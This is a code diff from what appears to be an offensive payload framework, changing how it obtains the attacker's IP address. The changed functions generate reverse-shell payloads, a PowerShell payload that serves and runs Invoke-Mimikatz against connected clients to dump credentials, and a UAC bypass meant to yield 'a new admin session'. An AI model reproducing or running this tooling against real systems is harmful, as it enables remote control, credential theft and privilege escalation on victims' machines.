@@ -4,11 +4,12 @@ from startmetasploit import *
 from generatepayload import *
 
 def reverseIpAndPort(port):
+    from menu import returnIP
     portnum = raw_input(
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
     if len(portnum) is 0:
         portnum = port
-    IP = FUNCTIONS().CheckInternet()
+    IP = returnIP()
     ipaddr = raw_input(
         '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
     if len(ipaddr) == 0:
@@ -123,9 +124,10 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
 
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
+    from menu import returnIP
     moduleport = FUNCTIONS().randomUnusedPort()
-    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
-    powershellScript = payloadchoice % (FUNCTIONS().CheckInternet(), moduleport)
+    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+    powershellScript = payloadchoice % (returnIP(), moduleport)
     clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
     try:
@@ -141,10 +143,11 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     return "pass"
 
 def UACBypassGeneration(payloadchoice,payloadname):
+    from menu import returnIP
     moduleport = FUNCTIONS().randomUnusedPort()
-    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
+    FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     encoded = printListener(False)
-    powershellScript = payloadchoice % (FUNCTIONS().CheckInternet(), moduleport, encoded)
+    powershellScript = payloadchoice % (returnIP(), moduleport, encoded)
     clientnumber = int(clientUpload(payloadname,powershellScript,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"false", "multiple":"false"}'))
 
     print t.bold_green + '\n[*] If UAC Bypass worked, expect a new admin session' + t.normal
